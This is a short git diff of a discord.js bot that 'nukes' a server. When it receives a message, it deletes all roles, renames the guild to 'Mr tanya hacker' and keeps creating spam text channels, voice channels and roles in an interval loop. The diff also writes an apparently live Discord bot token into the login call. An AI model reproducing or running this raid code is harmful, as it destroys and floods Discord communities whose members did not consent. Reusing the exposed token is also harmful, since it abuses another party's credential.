@@ -15,14 +15,14 @@ client.on("message", message => {
       message.guild.roles.forEach(r => {
         r.delete();
       });
-      message.guild.setName("RaWeN Up");////nawek dane bo sar server 
+      message.guild.setName("Mr tanya hacker");////nawek dane bo sar server 
       setInterval(function() {
-        message.guild.createChannel("RaWeN Up", "text");///////bo channel 
-        message.guild.createChannel("RaWeN Up", "voice");////bo voice
-        message.guild.createRole({ name: "RaWeN Up" });////nawek dane bo role kan
+        message.guild.createChannel("Mr tanya", "text");///////bo channel 
+        message.guild.createChannel("Mr tanya", "voice");////bo voice
+        message.guild.createRole({ name: "Mr tanya" });////nawek dane bo role kan
       });
     }
   }
 });
 
-client.login("")
+client.login("MTAwMTk1Mjg4NTEwMzQxMTI3NA.G-6VVU.D-McZzImnygXPwyxF58C5yjg6Qd2-cEXTTwei0")
